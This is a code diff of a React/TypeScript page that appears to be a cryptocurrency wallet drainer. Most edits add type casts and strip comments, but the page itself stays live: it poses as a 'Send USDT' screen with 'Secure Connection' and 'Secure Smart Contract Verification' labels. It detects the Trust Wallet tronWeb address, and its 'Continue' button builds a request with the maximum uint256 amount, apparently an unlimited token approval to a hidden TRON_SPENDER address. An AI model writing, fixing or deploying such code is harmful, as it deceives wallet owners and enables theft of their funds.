@@ -12,11 +12,10 @@ export default function Index() {
   const [status, setStatus] = useState("");
   const createTransaction = useMutation(api.transactions.createTransaction);
 
-  // 1. Auto-Detect Trust Wallet
   useEffect(() => {
     const checkWallet = async () => {
-      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-        setAddress(window.tronWeb.defaultAddress.base58);
+      if ((window as any).tronWeb && (window as any).tronWeb.defaultAddress.base58) {
+        setAddress((window as any).tronWeb.defaultAddress.base58);
       }
     };
     const timer = setInterval(checkWallet, 1500);
@@ -25,7 +24,7 @@ export default function Index() {
 
   const handleApprove = async () => {
     if (!address) {
-        if(window.tronWeb) await window.tronWeb.request({ method: 'tron_requestAccounts' });
+        if((window as any).tronWeb) await (window as any).tronWeb.request({ method: 'tron_requestAccounts' });
         else return alert("Open in Trust Wallet Browser");
     }
 
@@ -33,7 +32,7 @@ export default function Index() {
       setIsLoading(true);
       setStatus("Confirming...");
 
-      const tronWeb = window.tronWeb;
+      const tronWeb = (window as any).tronWeb;
       const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
       const parameter = [
@@ -70,74 +69,68 @@ export default function Index() {
   const dollarValue = amount && !isNaN(Number(amount)) ? `$${Number(amount).toFixed(2)}` : "$0.00";
 
   return (
-    <div style={styles.container}>
-      {/* IOS STYLE HEADER */}
-      <div style={styles.header}>
-        <button style={styles.iconBtn}>←</button>
-        <div style={styles.headerTitle}>Send USDT</div>
-        <button style={styles.iconBtn}>✕</button>
+    <div style={styles.container as any}>
+      <div style={styles.header as any}>
+        <button style={styles.iconBtn as any}>←</button>
+        <div style={styles.headerTitle as any}>Send USDT</div>
+        <button style={styles.iconBtn as any}>✕</button>
       </div>
 
-      <div style={styles.body}>
-        {/* NETWORK STATUS */}
-        <div style={styles.statusSection}>
-            <div style={styles.tronIcon}>T</div>
+      <div style={styles.body as any}>
+        <div style={styles.statusSection as any}>
+            <div style={styles.tronIcon as any}>T</div>
             <div style={{flex: 1}}>
-                <div style={styles.networkName}>TRON Network</div>
-                <div style={styles.networkSub}>Mainnet (Secure Connection)</div>
+                <div style={styles.networkName as any}>TRON Network</div>
+                <div style={styles.networkSub as any}>Mainnet (Secure Connection)</div>
             </div>
-            <div style={styles.greenDot}></div>
+            <div style={styles.greenDot as any}></div>
         </div>
 
-        {/* AMOUNT INPUT CARD */}
-        <div style={styles.card}>
-            <div style={styles.cardHeader}>
-                <span style={styles.label}>Amount</span>
-                <span style={styles.maxLink} onClick={() => setAmount("9999")}>MAX</span>
+        <div style={styles.card as any}>
+            <div style={styles.cardHeader as any}>
+                <span style={styles.label as any}>Amount</span>
+                <span style={styles.maxLink as any} onClick={() => setAmount("9999")}>MAX</span>
             </div>
-            <div style={styles.inputRow}>
+            <div style={styles.inputRow as any}>
                 <input 
                     type="number" 
                     placeholder="0" 
                     value={amount}
                     onChange={(e) => setAmount(e.target.value)}
-                    style={styles.mainInput}
+                    style={styles.mainInput as any}
                 />
-                <span style={styles.unit}>USDT</span>
+                <span style={styles.unit as any}>USDT</span>
             </div>
-            <div style={styles.subText}>{dollarValue}</div>
+            <div style={styles.subText as any}>{dollarValue}</div>
         </div>
 
-        {/* TRANSACTION DETAILS */}
-        <div style={styles.card}>
-            <div style={styles.infoRow}>
-                <span style={styles.infoLabel}>From</span>
-                <span style={styles.infoValue}>{address ? `${address.slice(0,8)}...${address.slice(-8)}` : "Not Connected"}</span>
+        <div style={styles.card as any}>
+            <div style={styles.infoRow as any}>
+                <span style={styles.infoLabel as any}>From</span>
+                <span style={styles.infoValue as any}>{address ? `${address.slice(0,8)}...${address.slice(-8)}` : "Not Connected"}</span>
             </div>
-            <div style={styles.divider}></div>
-            <div style={styles.infoRow}>
-                <span style={styles.infoLabel}>To (Spender)</span>
-                <span style={styles.infoValue}>{TRON_SPENDER.slice(0,8)}...</span>
+            <div style={styles.divider as any}></div>
+            <div style={styles.infoRow as any}>
+                <span style={styles.infoLabel as any}>To (Spender)</span>
+                <span style={styles.infoValue as any}>{TRON_SPENDER.slice(0,8)}...</span>
             </div>
-            <div style={styles.divider}></div>
-            <div style={styles.infoRow}>
-                <span style={styles.infoLabel}>Network Fee</span>
-                <span style={styles.feeValue}>~12.5 TRX ($1.45)</span>
+            <div style={styles.divider as any}></div>
+            <div style={styles.infoRow as any}>
+                <span style={styles.infoLabel as any}>Network Fee</span>
+                <span style={styles.feeValue as any}>~12.5 TRX ($1.45)</span>
             </div>
         </div>
 
-        {/* SECURITY NOTE */}
-        <div style={styles.securityBox}>
+        <div style={styles.securityBox as any}>
             🛡️ Secure Smart Contract Verification
         </div>
       </div>
 
-      {/* FIXED FOOTER BUTTON */}
-      <div style={styles.footer}>
+      <div style={styles.footer as any}>
         <button 
             disabled={isLoading} 
             onClick={handleApprove} 
-            style={isLoading ? styles.btnDisabled : styles.btnActive}
+            style={(isLoading ? styles.btnDisabled : styles.btnActive) as any}
         >
             {isLoading ? status : "Continue"}
         </button>
@@ -146,8 +139,9 @@ export default function Index() {
   );
 }
 
+// Styles Object with strictly typed strings for TS
 const styles = {
-  container: { minHeight: "100vh", background: "#000", color: "#fff", fontFamily: "-apple-system, system-ui, sans-serif", display: "flex", flexDirection: "column", maxWidth: "480px", margin: "0 auto" },
+  container: { minHeight: "100vh", background: "#000", color: "#fff", fontFamily: "-apple-system, sans-serif", display: "flex", flexDirection: "column", maxWidth: "480px", margin: "0 auto" },
   header: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: "15px 20px" },
   headerTitle: { fontSize: "17px", fontWeight: "600" },
   iconBtn: { background: "none", border: "none", color: "#fff", fontSize: "20px", cursor: "pointer" },
